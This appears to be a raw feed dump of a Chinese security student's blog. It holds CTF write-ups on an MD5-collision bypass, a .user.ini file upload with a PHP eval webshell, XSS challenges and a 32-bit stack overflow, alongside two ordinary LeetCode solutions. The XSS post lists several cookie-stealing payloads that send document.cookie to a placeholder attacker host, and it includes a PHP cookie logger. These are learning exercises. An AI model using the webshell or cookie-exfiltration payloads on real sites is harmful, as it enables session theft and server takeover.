class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>主要的难点就在于MD5强碰撞，不过已经有现成的脚本（fastcoll_v1.0.0.5.exe 可以在GitHub上找到）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br></pre></td></tr></table></figure>
<p>这里附上现成的结果，下次可以直接撸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%7Eb%12%F5%876u%1Fl%90%A9%96AH%C1%83%7B%B1%D27%DDfuA%10%C6y%CE-%FE%BE%9DH%E1%B3%ED%CE%9F%DB8%CB%E1%C3%12%BB%D3%19%18%27%E0%0D%DC%BDQ%95%EA%8F%1F%DDu%87%21J.%C9%C3%AF%5ER%CE%AD5I%8E%00%D9O%AF%E4%23%22u%F2%F6%17%B4%E0%1C%D5%F7%12%C9%CC0%7D%22%037%1F%FF%7D%2C%93%D6%8F%B4%A0%AFT%05S%C6%D8%609F%8B%7E%EB%F6%E3%1A%E0o%DB%A1%2C%A7</span><br><span class="line"></span><br><span class="line">gg=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%7Eb%12%F5%876u%1Fl%90%A9%96AH%C1%83%7B%B1%D2%B7%DDfuA%10%C6y%CE-%FE%BE%9DH%E1%B3%ED%CE%9F%DB8%CB%E1%C3%12%BBS%1A%18%27%E0%0D%DC%BDQ%95%EA%8F%1F%DD%F5%87%21J.%C9%C3%AF%5ER%CE%AD5I%8E%00%D9O%AF%E4%23%22u%F2v%17%B4%E0%1C%D5%F7%12%C9%CC0%7D%22%037%1F%FF%7D%2C%93%D6%8F%B4%A0%AFT%85R%C6%D8%609F%8B%7E%EB%F6%E3%1A%E0%EF%DB%A1%2C%A</span><br></pre></td></tr></table></figure>
<p>第二个绕过点就很简单了，直接利用PHP字符串隐式转数字的特点：<code>password = 1234567a</code>就可以过了。</p>
<h2 id="3、SUCTF-Checkin-user-ini-文件上传"><a href="#3、SUCTF-Checkin-user-ini-文件上传" class="headerlink" title="3、SUCTF-Checkin(.user.ini 文件上传)"></a>3、SUCTF-Checkin(.user.ini 文件上传)</h2><p>打开题目界面，发现这样的场景。</p>
<p>直接上传正常的文件，我们可以发现可以直接访问到一个upload的目录，在该目录下存在我们上传的文件和一个index.php。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_1.png" alt=""></p>
<p>首先上传一个简单的测试，基本可以猜测后端会检查文件类型，上传PHP类型等直接解析的文件类型的成功概率不大（尝试一下如php3，phtml等常见绕过文件名）。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_2.png" alt=""></p>
<p>这回返回报错说检测到&lt;?的存在，这好办直接改成</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_4.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>（补充：其实这里可以当成1.html，传上去，但是rce的时候会被405 Forbidden，其实感觉一个突破点）。</p>
<p>把文件名改成jpg上传之后，发现返回了文件头检测的报错，于是填上GIF的文件头<code>GIF89a</code>尝试骗过去。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_3.png" alt=""></p>
<p>这下传上去了，尝试进入对应目录的index.php，很遗憾，没有文件包含解析漏洞的环节。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_8.png" alt=""></p>
<p>接下来就是查资料了，直接查到P牛关于.user.ini利用的漏洞。</p>
<p>php解析的时候，同文件夹的ini文件其实是能影响的。</p>
<p>接下来，利用auto_prepend_file和auto_append_file这两个设置，我们将.user.ini传上去，再利用文件包含漏洞，成功获得了后门的权限。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_6.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_7.png" alt=""></p>
<p>参考wp:</p>
<p><a href="https://xz.aliyun.com/t/6091">https://xz.aliyun.com/t/6091</a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>php</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>buuoj</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-xss-wp</title>
    <url>/2021/11/23/blog0004-ctfshow-xss-wp/</url>
    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
<span id="more"></span>
<p>反射型常见trick：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python for temporary site</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server &#123;port&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP for store the http request</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span></span><br><span class="line"><span class="comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span></span><br><span class="line"><span class="comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试#试(find / -name &quot;cookie.txt&quot;)</span></span><br></pre></td></tr></table></figure>
<h2 id="反射型（Web316-Web326"><a href="#反射型（Web316-Web326" class="headerlink" title="反射型（Web316 - Web326)"></a>反射型（Web316 - Web326)</h2><p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
<p>不过会有各种过滤</p>
<p>附上payload，一般都试试，如果过不去了可以试试其他banfa</p>
<p>xss平台：<a href="https://xss.pt/">https://xss.pt/</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先是经典的img</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.src = <span class="string">&quot;http://your-domain:port/&quot;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//location.href系列</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://your-domain:port/&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//iframe标签</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://your-domain:port/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//input标签</span></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">    </span><br><span class="line">//svg标签</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">    </span><br><span class="line">//body标签</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h3 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h3><p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
<p>顺利搞到管理员的cookie</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe	onload=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<h3 id="Web-329"><a href="#Web-329" class="headerlink" title="Web 329"></a>Web 329</h3>]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>xss</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>ctfshow</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF-warmup-目录穿越</title>
    <url>/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
    <content><![CDATA[<h2 id="一、题目重点"><a href="#一、题目重点" class="headerlink" title="一、题目重点"></a>一、题目重点</h2><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片"></p>
<p>我们首先来看一下</p>
<span id="more"></span>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>LFI</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-分治-为运算表达式设计优先级</title>
    <url>/2022/03/27/blog0006-leetcode-%E5%88%86%E6%B2%BB-%E4%B8%BA%E8%BF%90%E7%AE%97%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%BE%E8%AE%A1%E4%BC%98%E5%85%88%E7%BA%A7/</url>
    <content><![CDATA[<h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给你一个由数字和运算符组成的字符串 <code>expression</code> ，按不同优先级组合数字和运算符，计算并返回所有可能组合的结果。你可以 <strong>按任意顺序</strong> 返回答案</p>
<span id="more"></span>
<p><strong>示例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：expression = &quot;2-1-1&quot;</span><br><span class="line">输出：[0,2]</span><br><span class="line">解释：</span><br><span class="line">((2-1)-1) = 0 </span><br><span class="line">(2-(1-1)) = 2</span><br><span class="line"></span><br><span class="line">输入：expression = &quot;2*3-4*5&quot;</span><br><span class="line">输出：[-34,-14,-10,-10,10]</span><br><span class="line">解释：</span><br><span class="line">(2*(3-(4*5))) = -34 </span><br><span class="line">((2*3)-(4*5)) = -14 </span><br><span class="line">((2*(3-4))*5) = -10 </span><br><span class="line">(2*((3-4)*5)) = -10 </span><br><span class="line">(((2*3)-4)*5) = 10</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>1 &lt;= expression.length &lt;= 20</li>
<li>输入表达式中的所有整数值在范围 [0, 99] </li>
<li>expression 由数字和算符 ‘+’、’-‘ 和 ‘*’ 组成。</li>
</ul>
<h2 id="二、我的思路"><a href="#二、我的思路" class="headerlink" title="二、我的思路"></a>二、我的思路</h2><p>最开始，我的处理思路是对于一个expression，我们可以分解一个数字和一个剩余的表达式。将（2*3-4*5）分解为</p>
<script type="math/tex; mode=display">
2*(3-4*5)\\
2*3-(4*5)</script><p>但显然这样是不对的，我们需要注意的是，这样子我们就没有回头路了，简单的理解就是我们无法处理：</p>
<script type="math/tex; mode=display">
((2*3)-4)*5</script><p>但是一旦意识到我们存在这样的错误时，我们发现其实将我们前面的思路改进一下，当我们计算出<script type="math/tex">2*3</script>时，我们就把式子转化为$(6-4)*5$，这又是我们之前处理的范围了。</p>
<p>于是，我们将我们之前的思路扭转一下，对于任意的表达式$c$，我们可以将其拆分为$a$ op $b$，这样我们就得到了分治处理的思路。</p>
<p><strong>终止条件为：当表达式不存在操作符时，即表达式为数值时，我们直接返回数值本身</strong></p>
<p>我的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//计算表达式</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2 , <span class="keyword">char</span> op)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span>(op)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> num1 + num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> num1 - num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> num1 * num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">diffWaysToCompute</span><span class="params">(string expression)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = expression.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; v3;</span><br><span class="line">        <span class="keyword">int</span> op_flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> op = expression[i];</span><br><span class="line">            <span class="keyword">if</span>(!(op == <span class="string">&#x27;+&#x27;</span> || op == <span class="string">&#x27;-&#x27;</span> || op ==<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            op_flag = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//计算前半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v1 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>(),expression.<span class="built_in">begin</span>() + i));</span><br><span class="line">            <span class="comment">//计算后半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v2 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>() + i + <span class="number">1</span>,expression.<span class="built_in">end</span>()));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//二重循环，类似笛卡尔积</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;v1.<span class="built_in">size</span>();i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;v2.<span class="built_in">size</span>();j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    v3.<span class="built_in">push_back</span>(<span class="built_in">cal</span>(v1[i],v2[j],op));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不存在运算符，即到达终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(op_flag == <span class="number">0</span>)</span><br><span class="line">            v3.<span class="built_in">push_back</span>(<span class="built_in">stoi</span>(expression));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
        <category>分治</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-分治-最接近原点的K个点</title>
    <url>/2022/03/27/blog0007-leetcode-%E5%88%86%E6%B2%BB-%E6%9C%80%E6%8E%A5%E8%BF%91%E5%8E%9F%E7%82%B9%E7%9A%84K%E4%B8%AA%E7%82%B9/</url>
    <content><![CDATA[<h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给定一个数组 points ，其中 points[i] = [xi, yi] 表示 X-Y 平面上的一个点，并且是一个整数 k ，返回离原点 (0,0) 最近的 k 个点。</p>
<p>这里，平面上两点之间的距离是 欧几里德距离（ √(x1 - x2)2 + (y1 - y2)2 ）。</p>
<p>你可以按 <strong>任何顺序</strong> 返回答案。除了点坐标的顺序之外，答案 确保 是 <strong>唯一</strong> 的。</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：points = [[1,3],[-2,2]], k = 1</span><br><span class="line">输出：[[-2,2]]</span><br><span class="line">解释： </span><br><span class="line">(1, 3) 和原点之间的距离为 sqrt(10)，</span><br><span class="line">(-2, 2) 和原点之间的距离为 sqrt(8)，</span><br><span class="line">由于 sqrt(8) &lt; sqrt(10)，(-2, 2) 离原点更近。</span><br><span class="line">我们只需要距离原点最近的 K = 1 个点，所以答案就是 [[-2,2]]。</span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入：points = [[3,3],[5,-1],[-2,4]], k = 2</span><br><span class="line">输出：[[3,3],[-2,4]]</span><br><span class="line">（答案 [[-2,4],[3,3]] 也会被接受。）</span><br></pre></td></tr></table></figure>
<h2 id="二、我的思路"><a href="#二、我的思路" class="headerlink" title="二、我的思路"></a>二、我的思路</h2><h4 id="思路一：排序"><a href="#思路一：排序" class="headerlink" title="思路一：排序"></a>思路一：排序</h4><p>显然是非常直观的思路，我们可以直接排序数组，返回前K个数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">kClosest</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;points.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;(i ,points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; (res.<span class="built_in">begin</span>(),res.<span class="built_in">begin</span>() + k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h4><p>我们这次主要是学习分治的思想，因此我们可以考虑使用快排的思路（其实algorithm的sort也是快排），当我们完成一次快排，我们可以将数组分为两个部分，因此我们可以借此不断将数组分割来找到第K个数。</p>
<p>代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; dist;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points,<span class="keyword">int</span> beg,<span class="keyword">int</span> end)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = beg;</span><br><span class="line">        <span class="keyword">int</span> j = end;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; p = points[beg];</span><br><span class="line">        <span class="keyword">int</span> p_dist = dist[beg];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; dist[j] &gt; p_dist)</span><br><span class="line">            &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">            &#123;</span><br><span class="line">                points[i] = points[j];</span><br><span class="line">                dist[i] = dist[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; dist[i] &lt;= p_dist)</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">            &#123;</span><br><span class="line">                points[j] = points[i];</span><br><span class="line">                dist[j] = dist[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        points[j] = p;</span><br><span class="line">        dist[j] = p_dist;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">select_random</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points,<span class="keyword">int</span> left,<span class="keyword">int</span> right,<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = <span class="built_in">partition</span>(points, left, right);</span><br><span class="line">        <span class="keyword">if</span> (pivot == k)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pivot &lt; k)</span><br><span class="line">        &#123;	<span class="comment">// 注意此时我们使用的是数组的引用，因此我们的K未发生变化</span></span><br><span class="line">            <span class="built_in">select_random</span>(points, pivot + <span class="number">1</span>, right, k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">select_random</span>(points, left, pivot - <span class="number">1</span>, k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">kClosest</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points, <span class="keyword">int</span> k) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tar = k - <span class="number">1</span>;</span><br><span class="line">        dist.<span class="built_in">resize</span>(points.<span class="built_in">size</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; points.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dist[i] = (points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">select_random</span>(points, <span class="number">0</span>, points.<span class="built_in">size</span>() - <span class="number">1</span>, tar);</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">res</span>(points.<span class="built_in">begin</span>(), points.<span class="built_in">begin</span>() + k);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
        <category>分治</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn-xctf-新手区wp</title>
    <url>/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
    <content><![CDATA[<h2 id="一、Level-2"><a href="#一、Level-2" class="headerlink" title="一、Level_2"></a>一、Level_2</h2><p>pwn到手第一步，先玩一玩看看.</p>
<span id="more"></span>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png" alt=""></p>
<p>简单的输入提示，基本上获得不了什么信息。</p>
<p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call  system 和 read，这给了我们布栈的空间。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 “/bin/sh”的地址。</p>
